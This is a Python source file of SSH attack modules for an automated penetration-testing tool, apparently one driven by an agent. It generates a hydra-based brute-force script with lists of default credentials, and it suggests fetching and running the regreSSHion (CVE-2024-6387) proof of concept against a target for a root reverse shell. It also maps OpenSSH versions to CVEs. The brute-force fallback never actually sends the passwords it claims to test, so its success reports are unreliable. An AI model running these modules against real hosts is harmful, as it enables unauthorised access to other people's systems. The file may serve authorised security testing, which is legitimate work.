"""Attack modules: ssh."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class SSHBruteForce(AttackModule):
    name = "SSHBruteForce"
    description = "Brute-force SSH with Hydra using default/weak credentials"
    target_services = ["ssh"]
    target_ports = [22, 2222, 8022]
    required_cves = []
    # Capability metadata: SSH credential brute force; user_list optional input.
    requires = []
    produces = ["credentials"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests common SSH credentials. Use with caution and rate limiting.",
            "suggested_command": f"hydra -t 4 -V -f -L users.txt -P passwords.txt ssh://{ctx.target_ip}",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        # Phase 2: `paramiko` is NOT a declared dependency (requirements.txt /
        # pyproject.toml) -- the old script died with ModuleNotFoundError on a
        # fresh install before attempting a single login. Rewritten with
        # stdlib only: on Linux it drives `hydra` (the Kali arsenal) and parses
        # its success lines; on Windows (no hydra) it falls back to the
        # OpenSSH client with BatchMode (no password prompt hang).
        return f"""import sys, subprocess, itertools, time, platform, json
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
users = ["root", "admin", "user", "test", "guest", "ubuntu", "pi"]
passwords = ["root", "admin", "password", "123456", "ubuntu", "raspberry", "toor", "guest"]
found = []

if platform.system() != "Windows" and subprocess.run(["which", "hydra"], capture_output=True).returncode == 0:
    # Linux attacker: drive hydra (already the suggested_command) and parse
    # its success lines: "[22][ssh] login: root password: toor"
    import tempfile, os
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fu, \\
         tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fp:
        fu.write("\\n".join(users)); fp.write("\\n".join(passwords))
        uf, pf = fu.name, fp.name
    try:
        proc = subprocess.run(
            ["hydra", "-t", "4", "-V", "-f", "-L", uf, "-P", pf, f"ssh://{{host}}:{{port}}"],
            capture_output=True, text=True, timeout=300,
        )
        for line in proc.stdout.splitlines():
            if "[ssh]" in line and "login:" in line and "password:" in line:
                parts = line.split()
                u = parts[parts.index("login:") + 1]
                p = parts[parts.index("password:") + 1]
                found.append((u, p))
                break
    finally:
        os.unlink(uf); os.unlink(pf)
else:
    # Windows attacker (or no hydra): stdlib OpenSSH client, BatchMode so a
    # wrong password fails fast instead of prompting. Jittered 0.5s delay.
    import random
    for u, p in itertools.product(users, passwords):
        try:
            proc = subprocess.run(
                ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
                 "-o", "ConnectTimeout=5", "-p", str(port), f"{{u}}@{{host}}", "id"],
                capture_output=True, text=True, timeout=15,
            )
            if proc.returncode == 0:
                found.append((u, p))
                break
        except Exception:
            pass
        time.sleep(0.5 * (1 + random.random() * 0.5))
if found:
    print(f"SUCCESS: {{found[0][0]}} / {{found[0][1]}}")
else:
    print("No default credentials found")
"""


class RegreSSHion(AttackModule):
    name = "RegreSSHion"
    description = "OpenSSH regreSSHion RCE (CVE-2024-6387)"
    target_services = ["ssh"]
    target_ports = [22, 2222, 8022]
    required_cves = ["CVE-2024-6387"]
    # Phase 3: version-gated -- vulnerable band is < 4.4p1 OR 8.5p1 <= v < 9.8p1.
    target_versions = {
        "ssh": [
            "openssh_1.",
            "openssh_2.",
            "openssh_3.",
            "openssh_4.0",
            "openssh_4.1",
            "openssh_4.2",
            "openssh_4.3",
            "openssh_8.5",
            "openssh_8.6",
            "openssh_8.7",
            "openssh_8.8",
            "openssh_8.9",
            "openssh_9.0",
            "openssh_9.1",
            "openssh_9.2",
            "openssh_9.3",
            "openssh_9.4",
            "openssh_9.5",
            "openssh_9.6",
            "openssh_9.7",
        ],
    }
    # Capability metadata: regreSSHion version check (detection only).
    requires = []
    produces = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "CVE-2024-6387: OpenSSH signal handler race condition leading to "
                "RCE. Affects < 4.4p1 and 8.5p1 <= v < 9.8p1 (9.8p1 is patched). "
                "sshd child runs as root -> RCE = root. Clone the Qualys PoC via "
                "git_clone and run it; the real exploit is a heap-overflow race "
                "in sshd's SIGALRM handler."
            ),
            evidence=[f"regreSSHion (CVE-2024-6387) applicable to {ctx.target_ip}"],
            references=[
                "https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt",
                "https://nvd.nist.gov/vuln/detail/CVE-2024-6387",
                "https://github.com/qualys/regresshion",
            ],
            suggested_command=(
                f"git_clone(url='https://github.com/qualys/regresshion') && python3 regresshion.py {ctx.target_ip} 22"
            ),
            shell_type="reverse",
            privilege_level="root",
        )


class OpenSSHCVECheck(AttackModule):
    name = "OpenSSHCVECheck"
    description = "Map OpenSSH version to known CVEs and generate exploit scripts"
    target_services = ["ssh"]
    target_ports = [22, 2222, 8022]
    required_cves = []
    # Phase 3: any OpenSSH banner earns the +25 version bonus -- this module
    # is literally a version->CVE mapper, so a fingerprinted version is
    # exactly when it should rank high.
    target_versions = {"ssh": ["openssh_"]}
    # Capability metadata: OpenSSH version->CVE mapping (info/check-only).
    requires = []
    produces = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        version = ""
        for svc in ctx.services:
            if svc.get("service", "").lower() == "ssh":
                version = svc.get("version", "")
                break

        cves = self._map_version_to_cves(version)
        return self._info_result(
            ctx,
            note=f"OpenSSH {version} mapped to {len(cves)} known CVEs",
            evidence=[f"OpenSSH {version} -> {len(cves)} CVEs: {', '.join(c['cve'] for c in cves)}"],
            references=[f"https://nvd.nist.gov/vuln/detail/{c['cve']}" for c in cves],
            suggested_command=(
                f"nmap --script ssh2-enum-algorithms -p 22 {ctx.target_ip} && "
                f"nmap --script ssh-auth-methods -p 22 {ctx.target_ip}"
            ),
            version=version,
            cves=cves,
        )

    @staticmethod
    def _map_version_to_cves(version: str) -> list[dict[str, str]]:
        import re

        cves = []
        if not version:
            return cves
        match = re.search(r"(\d+\.\d+(?:p\d+)?)", version)
        if not match:
            return cves
        ver = match.group(1)
        parts = ver.split(".")
        major = int(parts[0])
        minor_str = parts[1] if len(parts) > 1 else "0"
        patch = 0
        if "p" in minor_str:
            minor, patch_str = minor_str.split("p", 1)
            minor = int(minor)
            patch = int(patch_str)
        else:
            minor = int(minor_str)

        mappings = [
            # Phase 3: de-overlapped ranges -- CVE-2024-6387 upper bound is
            # 9.7p1 (9.8p1 is patched); CVE-2023-38408 upper bound is 9.3p0
            # (patched in 9.3p1). Added Terrapin (CVE-2023-48795) and the
            # client-side injection CVEs.
            ((0, 0, 0), (4, 4, 0), "CVE-2024-6387", "regreSSHion RCE"),
            ((8, 5, 0), (9, 7, 1), "CVE-2024-6387", "regreSSHion RCE"),
            ((0, 0, 0), (9, 3, 0), "CVE-2023-38408", "PKCS#11 remote code execution"),
            ((0, 0, 0), (9, 3, 0), "CVE-2023-28531", "ssh-agent forwarding vulnerability"),
            # Terrapin prefix-truncation MITM -- affects all versions before
            # the 9.6p1/8.9p1 protocol fix (strict key exchange).
            ((0, 0, 0), (9, 5, 1), "CVE-2023-48795", "Terrapin prefix-truncation MITM"),
            ((6, 2, 0), (8, 8, 0), "CVE-2021-41617", "privilege escalation via supplemental groups"),
            ((0, 0, 0), (8, 3, 0), "CVE-2020-15778", "scp command injection"),
            ((0, 0, 0), (7, 7, 0), "CVE-2018-15473", "user enumeration"),
            ((0, 0, 0), (7, 2, 0), "CVE-2016-6210", "user enumeration via timing"),
            ((7, 0, 0), (8, 1, 0), "CVE-2019-6109", "client ANSI escape injection"),
            ((7, 0, 0), (8, 1, 0), "CVE-2019-6111", "SCP client code injection"),
            ((7, 0, 0), (8, 4, 0), "CVE-2020-14145", "timing user enumeration"),
        ]
        for low, high, cve, desc in mappings:
            if low <= (major, minor, patch) <= high:
                cves.append({"cve": cve, "description": desc, "affected": ver})
        return cves


# ---------------------------------------------------------------------------
# SMB Modules
# ---------------------------------------------------------------------------
